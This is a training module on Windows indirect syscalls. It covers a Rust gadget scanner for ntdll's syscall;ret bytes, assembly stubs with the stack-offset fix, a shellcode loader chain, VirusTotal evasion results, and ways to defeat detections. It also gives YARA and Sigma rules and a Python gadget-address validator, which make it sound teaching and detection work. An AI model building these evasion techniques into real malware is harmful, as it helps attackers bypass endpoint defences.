# Stage 08: Indirect Syscalls — Learning Path

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Indirect Syscalls: Gadget Scanning and Call Stack Evasion |
| **Level** | Advanced |
| **Estimated Time** | 5-7 hours |
| **Category** | Windows Internals / Syscalls / Call Stack Forensics / Detection |
| **Platform** | Windows x64 |
| **Binary** | `indirect-syscalls.exe` (~293KB, Rust, PE64) |
| **Prerequisites** | Stage 07 (direct syscalls, SSN resolution, hook detection) |
| **MITRE ATT&CK** | T1106, T1027, T1620, T1562.001 |

---

## Why This Stage Exists — The Bridge from Stage 07

Stage 07 used direct syscalls — the `syscall` instruction executed inside the binary's own `.text` section. This bypassed ntdll hooks but created two new detection signals:

1. **YARA**: The `0F 05` (syscall) opcode in non-ntdll `.text` — legitimate binaries never contain this
2. **Call stack**: The return address pointed to `.text` instead of ntdll — anomalous

Stage 08 eliminates BOTH signals by using **indirect syscalls**:

```
Stage 07 (direct):                    Stage 08 (indirect):
┌──────────────────┐                 ┌──────────────────┐
│ your .text:      │                 │ your .text:      │
│   mov r10, rcx   │                 │   mov r10, rcx   │
│   mov eax, SSN   │                 │   mov eax, SSN   │
│   syscall  ← HERE│                 │   call gadget ──────┐
│                  │                 │                  │  │
│ YARA: 0F 05 ✓    │                 │ YARA: 0F 05 ✗   │  │
│ Stack: .text  ✓  │                 │ Stack: ntdll  ✗ │  │
└──────────────────┘                 └──────────────────┘  │
                                     ┌──────────────────┐  │
                                     │ ntdll .text:     │  │
                                     │   syscall ← HERE │◄─┘
                                     │   ret ──────────────► back to your code
                                     └──────────────────┘
```

The `syscall` instruction executes inside ntdll. The return address on the call stack points to ntdll. Both YARA and call stack analysis see a legitimate ntdll syscall.

### Real-World Context (2025-2026)

- **SysWhispers3** ([klezVirus](https://github.com/klezVirus/SysWhispers3)) — The standard indirect syscall generator for C/C++
- **RecycledGate** ([Maldev Academy](https://github.com/Maldev-Academy/RecycledGate)) — Gadget reuse across multiple syscalls
- **Cymulate BlindSide** ([2025](https://cymulate.com/blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints/)) — Hardware breakpoint evasion alongside indirect syscalls
- **Oblivion: Detecting Syscalls** ([2025](https://oblivion-malware.xyz/posts/detecting-syscalls/)) — Detection approaches that work even against indirect syscalls

---

## Prerequisites

Before starting this module, you should understand:
- Direct syscalls from Stage 07 (SSN resolution, `syscall` instruction, hook detection)
- Why direct syscalls create detection signals (YARA + call stack)
- The ntdll stub structure (`4C 8B D1 B8 XX XX ... 0F 05 C3`)
- x86-64 calling conventions (registers + stack args)
- The difference between `CALL` (pushes return address) and `JMP` (doesn't)

---

## Learning Objectives

By the end of this module, you will be able to:

1. **Explain** how indirect syscalls solve both YARA and call stack detection from Stage 07
2. **Implement** a gadget scanner that finds `syscall;ret` (0F 05 C3) inside ntdll's .text
3. **Understand** the CALL offset adjustment: why stack arg positions shift by -8 compared to direct syscalls
4. **Compare** direct vs indirect syscalls: same hook bypass, different detection surface
5. **Detect** indirect syscalls via gadget-address validation and timing analysis
6. **Write** detection rules targeting the gadget scanning pattern itself

---

## Section 1: Theory — The Gadget Approach

### What Is a Gadget?

In this context, a "gadget" is a short instruction sequence inside ntdll that we can jump to:

```
Gadget: 0F 05 C3   (syscall; ret)
```

ntdll contains dozens of these — every Nt* function ends with `syscall; ret`. We find ONE gadget and reuse it for ALL our indirect syscalls.

### Why CALL Instead of JMP?

Stage 07 used inline `syscall` — no need for a call/jmp. Stage 08 must redirect execution to the gadget. Two options:

**JMP to gadget**: Doesn't push a return address. After `syscall;ret`, `ret` pops whatever is on the stack — our original caller's return address. Stack arg offsets remain the same as Stage 07.

**CALL to gadget**: Pushes our return address. After `syscall;ret`, `ret` pops back to us. Cleaner flow, but shifts all stack arg positions by 8 bytes.

Stage 08 uses **CALL** because:
1. `ret` returns to a known location (after our `call` instruction) — predictable
2. The compiler can generate proper cleanup code (`add rsp`) after the call
3. The pushed return address is in OUR .text — but the `syscall` instruction is in ntdll, which is what call stack analysis checks

### The CALL Offset Adjustment

When using `CALL gadget` instead of inline `syscall`, the `call` instruction pushes 8 bytes (return address) onto the stack. The kernel reads 5th+ arguments from fixed stack offsets relative to the current RSP at syscall time.

```
Direct (Stage 07):                 Indirect (Stage 08):
  [rsp+0x28] = arg5                  CALL pushes 8 bytes
  [rsp+0x30] = arg6                  [rsp+0x28] = arg5 must be at [pre_call_rsp+0x20]
                                     [rsp+0x30] = arg6 must be at [pre_call_rsp+0x28]
```

So in the inline asm, stack args are placed 8 bytes LOWER than Stage 07:
- Stage 07: arg5 at `[rsp+0x28]`
- Stage 08: arg5 at `[rsp+0x20]` (after `sub rsp`, before `call`)

### Exercise 1: Verify the Offset (10 min)

In x64dbg, set a breakpoint on the `call` instruction inside `indirect_alloc`. At the breakpoint:
1. Note RSP value (call it `rsp_before_call`)
2. Check `[rsp_before_call + 0x20]` — this should contain `AllocationType` (0x3000)
3. Step INTO the `call` — RSP decreases by 8
4. Now check `[rsp + 0x28]` — this is `rsp_before_call + 0x20` — same value (0x3000)
5. The kernel reads from `[rsp + 0x28]` at syscall time — correct!

---

## Section 2: The Gadget Scanner

### Finding `syscall;ret` in ntdll

```rust
unsafe fn find_syscall_gadget(ntdll_base: *const u8) -> Option<*const u8> {
    // Parse PE to find .text section
    let e_lfanew = *(ntdll_base.add(0x3C) as *const i32) as usize;
    let nt = ntdll_base.add(e_lfanew);
    let num_sections = *(nt.add(6) as *const u16) as usize;
    let opt_hdr_size = *(nt.add(20) as *const u16) as usize;
    let first_section = nt.add(24 + opt_hdr_size);

    for i in 0..num_sections {
        let sec = first_section.add(i * 40);
        // Check section name starts with ".te"
        if *sec == b'.' && *sec.add(1) == b't' && *sec.add(2) == b'e' {
            let virt_addr = *(sec.add(12) as *const u32) as usize;
            let virt_size = *(sec.add(8) as *const u32) as usize;
            let text = ntdll_base.add(virt_addr);

            // Scan for 0F 05 C3 (syscall; ret)
            for j in 0..virt_size.saturating_sub(3) {
                if *text.add(j) == 0x0F
                   && *text.add(j+1) == 0x05
                   && *text.add(j+2) == 0xC3 {
                    return Some(text.add(j));
                }
            }
        }
    }
    None
}
```

**Key design choices**:
1. Only scan `.text` section — gadgets in `.data` or `.rsrc` would be suspicious
2. Return the FIRST match — ntdll has many; any one works
3. The gadget address is inside ntdll's address range — call stack analysis sees ntdll

### Exercise 2: Count Gadgets in ntdll (10 min)

```python
#!/usr/bin/env python3
"""Count syscall;ret gadgets in ntdll.dll."""
import ctypes

kernel32 = ctypes.windll.kernel32
ntdll_base = kernel32.GetModuleHandleA(b"ntdll.dll")

# Parse PE to find .text section
e_lfanew = ctypes.c_int.from_address(ntdll_base + 0x3C).value
nt = ntdll_base + e_lfanew
num_sections = ctypes.c_ushort.from_address(nt + 6).value
opt_hdr_size = ctypes.c_ushort.from_address(nt + 20).value
first_section = nt + 24 + opt_hdr_size

for i in range(num_sections):
    sec = first_section + i * 40
    name = bytes((ctypes.c_ubyte * 8).from_address(sec))
    if name.startswith(b'.text'):
        virt_addr = ctypes.c_uint.from_address(sec + 12).value
        virt_size = ctypes.c_uint.from_address(sec + 8).value
        text = ntdll_base + virt_addr

        count = 0
        for j in range(virt_size - 3):
            b0 = ctypes.c_ubyte.from_address(text + j).value
            b1 = ctypes.c_ubyte.from_address(text + j + 1).value
            b2 = ctypes.c_ubyte.from_address(text + j + 2).value
            if b0 == 0x0F and b1 == 0x05 and b2 == 0xC3:
                count += 1
                if count <= 5:
                    print(f"  Gadget at ntdll+0x{virt_addr+j:06X}")

        print(f"\n  Total syscall;ret gadgets in ntdll: {count}")
        print(f"  Any ONE of these can be used for indirect syscalls")
        break
```

**Expected output**: Dozens of gadgets — every Nt* function contains one. The binary only needs ONE.

---

## Section 3: Indirect vs Direct — Side by Side

### Code Comparison

**Stage 07 (direct) — NtAllocateVirtualMemory**:
```asm
sub rsp, 0x38
mov [rsp+0x28], arg5       ; stack arg at direct offset
mov [rsp+0x30], arg6
mov r10, rcx
syscall                     ; ← 0F 05 in YOUR .text
add rsp, 0x38
```

**Stage 08 (indirect) — NtAllocateVirtualMemory**:
```asm
sub rsp, 0x38
mov [rsp+0x20], arg5       ; stack arg shifted -8 (CALL adjustment)
mov [rsp+0x28], arg6
mov r10, rcx
call gadget                 ; ← CALL to ntdll's 0F 05 C3
add rsp, 0x38
```

**The only differences**:
1. Stack arg offsets: `+0x28/+0x30` → `+0x20/+0x28` (shifted by -8)
2. `syscall` → `call gadget` (same kernel transition, different origin)

### Detection Comparison

| Detection Method | Stage 07 (Direct) | Stage 08 (Indirect) |
|-----------------|-------------------|---------------------|
| YARA: `0F 05` in .text | **DETECTED** — opcode in binary | **NOT detected** — opcode only in ntdll |
| Call stack: return addr | **DETECTED** — .text, not ntdll | **NOT detected** — ntdll return addr |
| ETW Threat Intelligence | Detected (kernel-level) | **Still detected** (kernel sees all) |
| ntdll function hooks | Bypassed | **Bypassed** (same as direct) |
| Gadget address validation | N/A | **Detectable** — CALL target is mid-function in ntdll |
| Timing analysis | Normal | **Detectable** — extra `call;ret` adds ~2ns |

### Exercise 3: Verify No `syscall` in .text (10 min)

Open `indirect-syscalls.exe` in Ghidra:
1. Search for bytes `0F 05` in the binary's `.text` section
2. **You should find ZERO matches** — unlike Stage 07 which had 3
3. Now search ntdll.dll's `.text` for `0F 05` — dozens of matches
4. The binary CALLs into one of these ntdll gadgets

> **Q1**: If there's no `syscall` in the binary's .text, how does the YARA rule from Stage 07 (`Direct_Syscall_In_Text`) perform?

<details>
<summary>Answer</summary>

It does NOT match. The rule requires `#syscall >= 2` where `$syscall = { 0F 05 }`. Stage 08's binary contains zero `0F 05` sequences in .text. The Stage 07 YARA rule is completely ineffective against indirect syscalls.

This is exactly why Stage 08 exists — it solves the YARA detection problem from Stage 07.

</details>

---

## Section 3B: The CALL Offset Math — Worked Example

### Why Stack Args Shift by -8

This is the most subtle detail of indirect syscalls. When using `CALL gadget` instead of inline `syscall`, the `CALL` pushes an 8-byte return address onto the stack. This shifts ALL stack positions relative to the kernel's perspective.

**Direct syscall (Stage 07)** — NtAllocateVirtualMemory:
```
Before syscall:
  [rsp+0x00] = (unused)
  [rsp+0x28] = arg5 (AllocationType = 0x3000)
  [rsp+0x30] = arg6 (Protect = 0x04)

Kernel reads arg5 from [rsp+0x28] ← CORRECT
```

**Indirect syscall (Stage 08)** — same function:
```
Before CALL gadget:
  [rsp+0x00] = (unused)
  [rsp+0x20] = arg5 (AllocationType = 0x3000)  ← shifted -8
  [rsp+0x28] = arg6 (Protect = 0x04)            ← shifted -8

After CALL (pushes 8 bytes):
  [rsp+0x00] = return address (pushed by CALL)
  [rsp+0x08] = (was rsp+0x00)
  ...
  [rsp+0x28] = arg5 (was at rsp+0x20)  ← kernel reads here ✓
  [rsp+0x30] = arg6 (was at rsp+0x28)  ← kernel reads here ✓
```

**The formula**: `pre_call_offset = kernel_offset - 8`

| Argument | Kernel expects at | Direct (Stage 07) | Indirect (Stage 08) |
|----------|-------------------|--------------------|--------------------|
| arg5 | `[rsp+0x28]` | `[rsp+0x28]` | `[rsp+0x20]` |
| arg6 | `[rsp+0x30]` | `[rsp+0x30]` | `[rsp+0x28]` |
| arg7 | `[rsp+0x38]` | `[rsp+0x38]` | `[rsp+0x30]` |

### Exercise 3B: Verify the Offset in x64dbg (10 min)

1. Set breakpoint on the `call` instruction inside `indirect_alloc`
2. Note RSP. Check `[RSP+0x20]` — should contain `0x3000` (MEM_COMMIT | MEM_RESERVE)
3. Step INTO the `call` — RSP decreases by 8
4. Now check `[RSP+0x28]` — same value `0x3000` (shifted up by 8 from the CALL push)
5. This is where the kernel reads arg5 — correct!

> **Q**: What happens if you use the Stage 07 offsets (`+0x28/+0x30`) with CALL instead of inline syscall?

<details>
<summary>Answer</summary>

The kernel reads the wrong values. It expects arg5 at `[rsp+0x28]` after the CALL. If you placed arg5 at `[pre_call_rsp+0x28]`, after the CALL push it's at `[rsp+0x30]` — the kernel reads arg6 as arg5 and garbage as arg6. The syscall either fails (STATUS_INVALID_PARAMETER) or corrupts memory.

This is the #1 implementation bug in indirect syscalls. Getting the offset wrong crashes the process.

</details>

---

## Section 3C: VT Evasion — The Detection Surface Shift

### Empirical Results: Stage 07 vs Stage 08

| Binary | Score | Engines | `0F 05` in .text? |
|--------|-------|---------|-------------------|
| Stage 07 (direct) | 3/76 | ESET + **Google** + **Ikarus** | Yes (3 instances) |
| **Stage 08 (indirect)** | **3/76** | **ESET + AVG + Avast** | **No (0 instances)** |

Same total score — **completely different engines**:
- **Google Detected + Ikarus Trojan.Win64.Crypt**: Triggered by the `syscall` (0F 05) opcode in .text → ELIMINATED by indirect approach
- **AVG/Avast MalwareX-gen [Misc]**: ML classifiers triggered by PEB walk code mass → RETURNED because the gadget scanner adds code without adding benign API patterns

**The lesson**: Indirect syscalls are not "better" or "worse" than direct — they trade one detection surface for another. The optimal approach depends on which engines your target environment uses.

### Why AVG/Avast Returned

Stage 07 didn't trigger AVG/Avast because its `syscall` wrappers used raw inline asm — very compact code. Stage 08's gadget scanner adds ~80 lines of PE section parsing (reading section headers, comparing `.text` name, scanning bytes). This code mass is structurally similar to PE analysis tools — which ML classifiers associate with offensive tooling.

**The irony**: The gadget scanner makes the binary MORE evasive against instruction-pattern scanners (Google/Ikarus) but LESS evasive against ML classifiers (AVG/Avast). Security engineering is about choosing which detection surface you're willing to accept.

---

## Section 3D: Hands-On Lab — Trace the Indirect Syscall

### Exercise 3D: Follow Execution Through the Gadget (20 min)

1. Open `indirect-syscalls.exe` in x64dbg with ScyllaHide
2. Find `indirect_alloc` in the binary (search for `sub rsp, 0x38`)
3. Set a breakpoint on the `call` instruction (the one that targets the ntdll gadget)
4. When hit:
   - Note RAX (should contain the SSN)
   - Note R10 (should contain the first argument — process handle = -1)
   - Note the CALL target address — it should be inside ntdll's address range
5. Step INTO the call → you land at ntdll's `syscall; ret`
6. Step over `syscall` → kernel executes NtAllocateVirtualMemory
7. `ret` pops the return address → back in your .text section
8. Check RAX — NTSTATUS (0 = success)

**Key observation**: In the call stack window, the return address after `syscall` shows **ntdll** — not your binary. This is exactly what makes indirect syscalls harder to detect via call stack analysis.

### Exercise 3E: Compare Call Stacks (10 min)

Run both Stage 07 and Stage 08 in x64dbg. At the moment of the syscall:

**Stage 07 call stack:**
```
  0x00007FF6XXXX1234  direct-syscalls.exe!syscall_alloc+0x2A  ← YOUR code
  0x00007FF6XXXX5678  direct-syscalls.exe!main+0x1A0
```

**Stage 08 call stack:**
```
  0x00007FFB1234ABCD  ntdll.dll!NtAllocateVirtualMemory+0x12  ← ntdll (legitimate)
  0x00007FF6XXXX1234  indirect-syscalls.exe!indirect_alloc+0x30
  0x00007FF6XXXX5678  indirect-syscalls.exe!main+0x1A0
```

The Stage 08 call stack includes ntdll as the syscall origin — indistinguishable from a legitimate call.

---

## Section 4: Detection Engineering — Catching Indirect Syscalls

### The Gadget Scanning Pattern

Even though the `syscall` instruction isn't in the binary, the GADGET SCANNER code IS. The binary reads ntdll's PE headers and scans for `0F 05 C3`:

```yara
rule Indirect_Syscall_Gadget_Scanner
{
    meta:
        description = "Detects code that scans for syscall;ret gadgets in ntdll"
        author      = "Goodboy Framework"
        stage       = "08"
        technique   = "T1562.001"

    strings:
        // Checking bytes for 0F 05 C3 pattern
        // The scanner compares individual bytes against these constants
        $check_0f = { 80 ?? 0F }   // cmp byte [reg], 0x0F
        $check_05 = { 80 ?? 05 }   // cmp byte [reg+1], 0x05
        $check_c3 = { 80 ?? C3 }   // cmp byte [reg+2], 0xC3

        // PE section parsing (.text identification)
        $dot_text = { 2E 74 65 }   // ".te" (start of ".text")

        // PEB access (still needed for ntdll discovery)
        $peb = { 65 48 8B 04 25 60 00 00 00 }

    condition:
        uint16(0) == 0x5A4D and
        $peb and
        2 of ($check_*) and
        $dot_text
}
```

### Gadget Address Validation (Blue Team)

EDRs can detect indirect syscalls by validating WHERE the `CALL` goes:

```
Legitimate ntdll call:
  call [IAT entry] → ntdll!NtAllocateVirtualMemory (function START)

Indirect syscall:
  call 0x7FF8ABCD1234 → ntdll+0x12345 (MIDDLE of some Nt function)
```

The CALL target in an indirect syscall lands at `syscall;ret` which is near the END of an Nt function — not at the function's entry point. An EDR can check:
1. Is the CALL target inside ntdll? (Yes — looks legitimate)
2. Does the CALL target match any exported function's start address? (NO — it's mid-function)
3. **Flag**: CALL to ntdll at a non-exported offset = indirect syscall

### Exercise 4C: Compare Gadget Location to Export Addresses (15 min)

```python
#!/usr/bin/env python3
"""Find which Nt* function a gadget falls INSIDE — proves it's mid-function."""
import ctypes

kernel32 = ctypes.windll.kernel32
ntdll_base = kernel32.GetModuleHandleA(b"ntdll.dll")

# 1. Find the first syscall;ret gadget
e_lfanew = ctypes.c_int.from_address(ntdll_base + 0x3C).value
nt = ntdll_base + e_lfanew
num_secs = ctypes.c_ushort.from_address(nt + 6).value
opt_size = ctypes.c_ushort.from_address(nt + 20).value
first_sec = nt + 24 + opt_size

gadget_addr = None
for i in range(num_secs):
    sec = first_sec + i * 40
    name = bytes((ctypes.c_ubyte * 8).from_address(sec))
    if name.startswith(b".text"):
        va = ctypes.c_uint.from_address(sec + 12).value
        vs = ctypes.c_uint.from_address(sec + 8).value
        text = ntdll_base + va
        for j in range(vs - 3):
            if (ctypes.c_ubyte.from_address(text+j).value == 0x0F and
                ctypes.c_ubyte.from_address(text+j+1).value == 0x05 and
                ctypes.c_ubyte.from_address(text+j+2).value == 0xC3):
                gadget_addr = text + j
                break
        break

if not gadget_addr:
    print("No gadget found!")
    exit()

print(f"First gadget: 0x{gadget_addr:016x} (ntdll+0x{gadget_addr - ntdll_base:06x})")

# 2. Find which exported function contains this address
export_rva = ctypes.c_uint.from_address(ntdll_base + e_lfanew + 0x88).value
export_dir = ntdll_base + export_rva
num_names = ctypes.c_uint.from_address(export_dir + 0x18).value
names_rva = ctypes.c_uint.from_address(export_dir + 0x20).value
funcs_rva = ctypes.c_uint.from_address(export_dir + 0x1C).value
ords_rva = ctypes.c_uint.from_address(export_dir + 0x24).value

# Find nearest export BELOW the gadget
nearest_name = "???"
nearest_addr = 0
for i in range(num_names):
    ordinal = ctypes.c_ushort.from_address(ntdll_base + ords_rva + i * 2).value
    func_rva = ctypes.c_uint.from_address(ntdll_base + funcs_rva + ordinal * 4).value
    func_addr = ntdll_base + func_rva
    if func_addr <= gadget_addr and func_addr > nearest_addr:
        nearest_addr = func_addr
        name_rva = ctypes.c_uint.from_address(ntdll_base + names_rva + i * 4).value
        nearest_name = ctypes.string_at(ntdll_base + name_rva).decode()

offset = gadget_addr - nearest_addr
print(f"Nearest export: {nearest_name} at 0x{nearest_addr:016x}")
print(f"Gadget is at {nearest_name}+0x{offset:x} (offset {offset} bytes into the function)")
print(f"")
print(f"Is gadget == function start? {gadget_addr == nearest_addr}")
print(f"An EDR checking: CALL target matches export address? NO (mid-function)")
print(f"This is how EDRs detect indirect syscalls.")
```

### ETW Still Sees Everything

```
ETW Provider                              Direct  Indirect
Microsoft-Windows-Threat-Intelligence     ✓       ✓
  - Syscall source (user stack)           .text   ntdll (spoofed)
  - SSN in EAX                            ✓       ✓
  - Arguments                             ✓       ✓
```

**Key point**: ETW captures the syscall at the kernel level — it doesn't care whether the instruction was in .text or ntdll. The SSN, arguments, and result are all visible. Only the user-mode return address differs.

### Exercise 4: Detect the CALL-to-Mid-Function Pattern (15 min)

In x64dbg, trace the indirect syscall execution:
1. Set a breakpoint on the `call` instruction inside `indirect_alloc`
2. When hit, read the CALL target from the operand
3. Check: is this address the START of an exported ntdll function?
   - Find the nearest exported function below this address
   - If the CALL target is offset from the function start → indirect syscall
4. The offset will be near the END of the function (where `syscall;ret` lives)

### Sigma Rule: Suspicious PE Section Scanning

```yaml
title: Process Scans PE Section Headers of System DLLs
id: goodboy-stage08-gadget-scan
status: experimental
description: >
    Detects a process reading PE section headers of ntdll.dll or kernel32.dll,
    which may indicate gadget scanning for indirect syscalls.
logsource:
    product: windows
    category: process_access
detection:
    selection:
        TargetImage|endswith:
            - '\ntdll.dll'
        GrantedAccess|contains: '0x10'  # PROCESS_VM_READ
    filter_system:
        SourceImage|endswith:
            - '\csrss.exe'
            - '\smss.exe'
            - '\MsMpEng.exe'
    condition: selection and not filter_system
level: medium
tags:
    - attack.defense_evasion
    - attack.t1562.001
```

### Exercise 4B: Build a Gadget Address Validator (15 min)

```python
#!/usr/bin/env python3
"""Detect indirect syscalls by checking if CALL targets are mid-function in ntdll."""
import ctypes

kernel32 = ctypes.windll.kernel32
ntdll_base = kernel32.GetModuleHandleA(b"ntdll.dll")

# Parse ntdll exports to get all function start addresses
e_lfanew = ctypes.c_int.from_address(ntdll_base + 0x3C).value
export_rva = ctypes.c_uint.from_address(ntdll_base + e_lfanew + 0x88).value
export_dir = ntdll_base + export_rva
num_names = ctypes.c_uint.from_address(export_dir + 0x18).value
names_rva = ctypes.c_uint.from_address(export_dir + 0x20).value
funcs_rva = ctypes.c_uint.from_address(export_dir + 0x1C).value
ords_rva  = ctypes.c_uint.from_address(export_dir + 0x24).value

exported_addrs = set()
for i in range(num_names):
    ordinal = ctypes.c_ushort.from_address(ntdll_base + ords_rva + i * 2).value
    func_rva = ctypes.c_uint.from_address(ntdll_base + funcs_rva + ordinal * 4).value
    exported_addrs.add(ntdll_base + func_rva)

def check_call_target(addr):
    """Returns True if addr is a legitimate exported function start."""
    return addr in exported_addrs

# Example: check a known gadget address
# (In practice, you'd get this from tracing the binary's CALL targets)
test_addr = ntdll_base + 0x12345  # hypothetical mid-function address
print(f"Is 0x{test_addr:016x} an exported function? {check_call_target(test_addr)}")
print(f"Total ntdll exports: {len(exported_addrs)}")
print(f"If a CALL targets ntdll but NOT an exported address → indirect syscall")
```

---

## Section 5: Adversarial Thinking

### Challenge 1: Defeat the Gadget Scanner YARA Rule

Your YARA rule detects the `0F 05 C3` byte comparisons in the scanner. How does the attacker hide them?

<details>
<summary>Approaches</summary>

1. **Obfuscated comparison**: Instead of `cmp byte [reg], 0x0F`, use `xor al, 0xFF; cmp al, 0xF0` — same logic, different bytes
2. **Computed constants**: Build the search pattern at runtime from arithmetic (`0x0A + 0x05 = 0x0F`)
3. **Signature scanning by hash**: Instead of matching raw bytes, hash 3-byte windows and compare against `hash(0F 05 C3)` — no literal `0F`, `05`, `C3` in the binary
4. **Use a known gadget offset**: Hardcode the gadget offset per Windows version (like hardcoded SSNs). No scanner needed. Risk: breaks on updates

</details>

### Challenge 2: Defeat Gadget Address Validation

EDR checks that CALL targets match exported function starts. How do you make the CALL target look legitimate?

<details>
<summary>Approaches</summary>

1. **Call the ACTUAL function start**: Instead of scanning for a random gadget, CALL the start of a known Nt function (e.g., `NtClose`). The function prologue (`mov r10, rcx; mov eax, SSN`) runs but with YOUR SSN already in EAX (overwriting the function's SSN). Only works if the function doesn't validate its own SSN
2. **Trampoline through ntdll**: Find a `jmp` inside ntdll that reaches the gadget. CALL the `jmp` instruction — the CALL target is a legitimate ntdll address
3. **Stack spoofing**: Before the CALL, overwrite the stack so the call stack looks like a legitimate ntdll → kernelbase → kernel32 chain

</details>

### Challenge 3: Can ETW Be Bypassed?

ETW Threat Intelligence sees all syscalls. Can it be evaded?

<details>
<summary>Approaches</summary>

1. **Patch the ETW provider**: If running with sufficient privileges, patch the `EtwEventWrite` function in ntdll to skip Threat Intelligence events. Requires defeating PPL
2. **Timing evasion**: Make syscalls during high system activity (boot, Windows Update) when ETW event volume is high and processing is delayed
3. **The honest answer**: For user-mode malware without kernel access, ETW Threat Intelligence cannot be bypassed. It's a kernel-level mechanism protected by PPL. This is why EDR vendors invest heavily in ETW — it's the ultimate backstop

</details>

---

## Section 6: The Complete Execution Chain

```
indirect-syscalls.exe:
  init_app_config()              [gate 1]
  verify_env()                   [gate 2]
  preflight()                    [gate 3]
  PEB.BeingDebugged              [gate 4]
  sandbox_check()                [gate 5]

  ┌─── Phase 1: SSN + Gadget Resolution ────────────────────────┐
  │ find_module(H_NTDLL) → ntdll base                           │
  │ read_ssn() × 5 → SSNs for alloc/protect/thread/wait/close   │
  │ find_syscall_gadget() → 0F 05 C3 inside ntdll .text  (NEW)  │
  └─────────────────────────────────────────────────────────────┘

  XOR decrypt 302-byte shellcode

  ┌─── Phase 2: Indirect Syscalls (ALL via gadget) ─────────────┐
  │ indirect_alloc(ssn, gadget, ..., RW)    → CALL ntdll gadget │
  │ copy + scrub                                                │
  │ indirect_protect(ssn, gadget, ..., RX)  → CALL ntdll gadget │
  │ indirect_create_thread(ssn, gadget, ...)→ CALL ntdll gadget │
  │ indirect_wait(ssn, gadget, ...)         → CALL ntdll gadget │
  │ indirect_close(ssn, gadget, ...)        → CALL ntdll gadget │
  └─────────────────────────────────────────────────────────────┘

  → MessageBox("GoodBoy") appears
```

**Key difference from Stage 07**: ALL 5 syscalls go through the ntdll gadget. Stage 07 used kernel32 for wait/close. Stage 08 doesn't need kernel32 at all — ntdll is sufficient for everything.

---

## Section 7: Knowledge Check

**1. Stage 07's binary has 3 instances of `0F 05` in .text. How many does Stage 08 have?**

<details>
<summary>Answer</summary>

Zero. Stage 08 never executes `syscall` from its own .text section. It CALLs into ntdll's `syscall;ret` gadget instead. The `0F 05` opcode only exists inside ntdll.

</details>

**2. Why do stack arg offsets shift by -8 in indirect syscalls compared to direct?**

<details>
<summary>Answer</summary>

`CALL gadget` pushes 8 bytes (return address) onto the stack before the gadget's `syscall` executes. The kernel reads 5th+ arguments at fixed offsets from RSP. With the extra 8 bytes on the stack, args must be placed 8 bytes lower (relative to the pre-CALL RSP) so they end up at the right offset after the push.

Stage 07 (direct): arg5 at `[rsp+0x28]`
Stage 08 (indirect): arg5 at `[rsp+0x20]` (because CALL adds 8 → kernel sees `[rsp+0x28]`)

</details>

**3. An EDR validates that CALL targets match ntdll exported function addresses. Does this catch Stage 08?**

<details>
<summary>Answer</summary>

Yes. The gadget is at `syscall;ret` near the END of an Nt function — not at the function's START (exported address). The CALL target won't match any exported address. The EDR can flag: "CALL to ntdll at non-exported offset."

Fix: CALL the actual function start and rely on EAX already containing the desired SSN. But this is fragile and version-dependent.

</details>

**4. Stage 08 uses all 5 syscalls via indirect (no kernel32). Stage 07 used kernel32 for wait/close. Why is Stage 08's approach better?**

<details>
<summary>Answer</summary>

Stage 08 doesn't need kernel32 at all for the offensive chain — everything goes through ntdll indirect syscalls. This means:
1. No kernel32 hash constants in .rdata (smaller detection surface)
2. No PEB walk to find kernel32 (only ntdll needed)
3. Consistent call stack — all operations show ntdll return addresses
4. No penalty for more indirect syscalls (no `0F 05` in .text regardless of count)

The VT penalty for extra `syscall` instructions that existed in Stage 07 doesn't apply here.

</details>

---

## Module Summary

| Concept | Stage 07 (Direct) | Stage 08 (Indirect) |
|---------|-------------------|---------------------|
| `syscall` instruction location | Binary's .text | **ntdll's .text (via gadget)** |
| YARA: `0F 05` in .text | Detected (3 instances) | **Not detected (0 instances)** |
| Call stack return address | .text (anomalous) | **ntdll (legitimate-looking)** |
| Gadget scanner | Not needed | **Scans ntdll for 0F 05 C3** |
| Stack arg adjustment | Direct offsets | **CALL-adjusted (-8 bytes)** |
| kernel32 dependency | Yes (wait/close) | **No — all via ntdll** |
| Hook bypass | Yes | **Yes (same)** |
| ETW detection | Yes (kernel-level) | **Yes (same — cannot be bypassed)** |
| New detection surface | `0F 05` in .text | **CALL to mid-function ntdll address** |

### Common Misconceptions

| What People Believe | What's Actually True |
|--------------------|-----------------------|
| "Indirect syscalls are undetectable" | Gadget address validation catches CALL-to-mid-function. ETW still sees everything. The scanner code itself is YARA-detectable |
| "You need a different gadget per syscall" | One gadget works for all — `syscall;ret` is generic. The SSN in EAX determines which kernel function runs |
| "CALL and JMP to the gadget are equivalent" | CALL pushes a return address (shifts stack by 8). JMP doesn't (but `ret` pops the wrong address). CALL is cleaner but requires offset adjustment |
| "Indirect syscalls bypass ETW" | ETW Threat Intelligence is kernel-level — it sees all syscalls regardless of user-mode tricks. Only a kernel driver can filter ETW events |

### What Breaks at Stage 09 — The Bridge

Stages 07-08 taught syscall mechanics. Stage 09 shifts focus to **anti-debug** — using the PEB and Nt* APIs you've mastered to detect and evade debuggers. The same `NtQueryInformationProcess` that an analyst uses to inspect processes can be turned against them.

### MITRE ATT&CK Mapping

| Technique | ID | How It's Used |
|-----------|----|---------------|
| Native API | T1106 | Indirect syscalls to NtAllocateVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx, NtWaitForSingleObject, NtClose |
| Obfuscated Files | T1027 | XOR-encrypted shellcode in .rdata |
| Reflective Code Loading | T1620 | Allocate → protect → execute shellcode in own process |
| Impair Defenses | T1562.001 | Bypass EDR userland hooks via indirect ntdll gadget execution |

### Further Reading (2025-2026)

- [SysWhispers3](https://github.com/klezVirus/SysWhispers3) — Indirect syscall stub generator (C/C++)
- [RecycledGate](https://github.com/Maldev-Academy/RecycledGate) — Gadget reuse across multiple syscalls
- [Oblivion: Detecting Syscalls](https://oblivion-malware.xyz/posts/detecting-syscalls/) — Detection approaches for both direct and indirect
- [Cymulate BlindSide](https://cymulate.com/blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints/) — Hardware breakpoint evasion

## What's Next

- **Stage 09 (Anti-Debug)**: 7 anti-debug techniques using the PEB and Nt* APIs mastered in Stages 04-08
- **Stage 10 (Anti-Sandbox)**: Hardware fingerprinting and weighted scoring
